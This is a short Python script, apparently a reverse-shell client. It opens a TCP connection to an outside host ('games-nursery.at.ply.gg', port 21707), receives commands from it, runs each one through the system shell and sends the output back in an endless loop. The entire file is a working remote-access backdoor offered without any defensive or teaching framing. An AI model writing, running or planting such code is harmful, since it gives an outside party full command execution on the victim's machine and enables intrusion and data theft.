from asyncio import constants
import socket
import subprocess
from unittest import result
host_ip = "games-nursery.at.ply.gg"
host_port = 21707

def execute_system_command(command):
    cmd = command.decode()
    print(cmd)
    res = subprocess.check_output(cmd,shell=True)
    return str(res)

connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection.connect((host_ip,host_port))
# connection.send("\n[+] Connection Established.\n\n".encode())
print("\n[+] Connection Established.\n\n")

while True:
    command = connection.recv(2048)
    print(command.decode())
    result = str(execute_system_command(command))
    # result = "Hi"
    connection.send(result.encode())
connection.close()